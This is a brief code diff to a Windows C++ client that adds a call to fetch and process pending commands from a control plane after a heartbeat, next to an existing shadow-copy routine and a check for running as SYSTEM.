@@ -1,5 +1,6 @@
 #include "client.h"
 #include "permissions.h"
+#include "commands.h"
 extern int RunShadowCopy();
 #include <Windows.h>
 #include <iostream>
@@ -28,6 +29,8 @@ int main() {
     if (!sendHeartbeat(cfg)) {
         std::cerr << "Heartbeat failed" << std::endl;
     }
+    // Fetch and process any pending commands from the control plane
+    processCommands(cfg);
 
     // Permissions handling: ensure the process runs as SYSTEM
     if (!IsRunningAsLocalSystem()) {
